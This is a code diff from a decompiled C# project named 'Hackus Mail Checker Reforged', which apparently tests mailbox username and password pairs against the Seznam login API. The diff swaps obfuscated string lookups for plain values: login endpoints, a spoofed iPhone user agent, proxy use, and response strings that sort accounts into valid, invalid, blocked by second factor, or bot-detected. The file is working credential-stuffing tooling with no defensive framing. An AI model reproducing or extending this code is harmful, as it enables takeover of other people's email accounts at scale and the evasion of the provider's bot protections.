@@ -71,33 +71,33 @@ namespace Hackus_Mail_Checker_Reforged.Net
 					{
 						username = this._mailbox.Address,
 						password = this._mailbox.Password,
-						service = _Module_.smethod_6<string>(1848814709),
-						return_url = _Module_.smethod_4<string>(-872950308)
+						service = "oauth",
+						return_url = "https://login.szn.cz/api/v1/oauth/result"
 					});
-					string text2 = httpRequest.Post(_Module_.smethod_4<string>(1233356625), text, _Module_.smethod_4<string>(-423852883)).ToString();
+					string text2 = httpRequest.Post("https://login.szn.cz/api/v1/login", text, "application/json").ToString();
 					if (text2.ContainsOneIgnoreCase(new string[]
 					{
-						_Module_.smethod_6<string>(220166365),
-						_Module_.smethod_3<string>(401681461),
-						_Module_.smethod_5<string>(-1676814541),
-						_Module_.smethod_3<string>(-1564920533)
+						"compulsory password change with phone",
+						"user is disabled",
+						"authorize by the second factor",
+						"user is disabled by gdpr"
 					}))
 					{
 						return OperationResult.Blocked;
 					}
 					if (text2.ContainsOneIgnoreCase(new string[]
 					{
-						_Module_.smethod_2<string>(383658666),
-						_Module_.smethod_3<string>(-1805453592)
+						"user supplied invalid credentials",
+						"Username is malformed"
 					}))
 					{
 						return OperationResult.Bad;
 					}
-					if (text2.Contains(_Module_.smethod_2<string>(568625173)))
+					if (text2.Contains("\"message\": \"ok\""))
 					{
 						return OperationResult.Ok;
 					}
-					if (text2.Contains(_Module_.smethod_4<string>(2003387409)))
+					if (text2.Contains("robot detected"))
 					{
 						return OperationResult.HttpError;
 					}
@@ -121,9 +121,9 @@ namespace Hackus_Mail_Checker_Reforged.Net
 			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
 			request.Cookies = this._cookies;
 			request.Proxy = this._proxyClient;
-			request.UserAgent = _Module_.smethod_5<string>(1482021352);
-			request.AddHeader(_Module_.smethod_6<string>(-452519608), _Module_.smethod_5<string>(1409696498));
-			request.AddHeader(_Module_.smethod_3<string>(-1607191919), _Module_.smethod_6<string>(-1488460431));
+			request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1";
+			request.AddHeader("Accept", "application/json;q=0.9,*/*;q=0.8");
+			request.AddHeader("Accept-Language", "en-US,en;q=0.5");
 		}
 
 		// Token: 0x060005A6 RID: 1446 RVA: 0x00009CB1 File Offset: 0x00007EB1
